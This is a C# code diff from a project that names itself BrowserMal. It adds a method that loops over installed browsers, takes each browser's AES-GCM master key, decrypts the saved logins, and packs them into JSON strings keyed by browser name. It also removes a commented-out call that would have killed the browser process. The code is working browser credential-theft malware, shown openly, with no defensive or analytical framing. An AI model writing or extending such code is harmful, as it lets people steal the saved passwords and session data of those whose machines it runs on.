@@ -14,11 +14,44 @@ namespace BrowserMal.Manager
     {
         private readonly string tableName;
         private readonly SqliteTableModel sqliteTableModel;
+        private readonly Dictionary<string, string> resultList;
 
         public GenericManager(string tableName, SqliteTableModel sqliteTableModel)
         {
             this.tableName = tableName;
             this.sqliteTableModel = sqliteTableModel;
+            this.resultList = new Dictionary<string, string>();
+        }
+
+        public Dictionary<string, string> Init(ref List<BrowserModel> browsers, string profileType)
+        {
+            try
+            {
+                foreach (BrowserModel browser in browsers)
+                {
+                    if (!Directory.Exists(browser.Location))
+                        continue;
+
+                    byte[] key = AesGcm256.GetMasterKey(browser.Location);
+
+                    if (key == null)
+                        continue;
+
+                    browser.MasterKey = key;
+
+                    List<T> result = GetLogins(browser.Location, browser.MasterKey, profileType);
+
+                    if (result.Count == 0)
+                        continue;
+
+                    resultList.Add($"{browser.Name}_{tableName}.json", JsonUtil.GetJson<T>(result));
+                }
+
+                return resultList;
+            }
+            catch { }
+
+            return new Dictionary<string, string>();
         }
 
         public void Init(ref List<BrowserModel> browsers, string profileType, string outputPath)
@@ -36,7 +69,6 @@ namespace BrowserMal.Manager
                         continue;
 
                     browser.MasterKey = key;
-                    //ProcessUtil.KillProcess(browser.ProcessName);
 
                     List<T> result = GetLogins(browser.Location, browser.MasterKey, profileType);
 
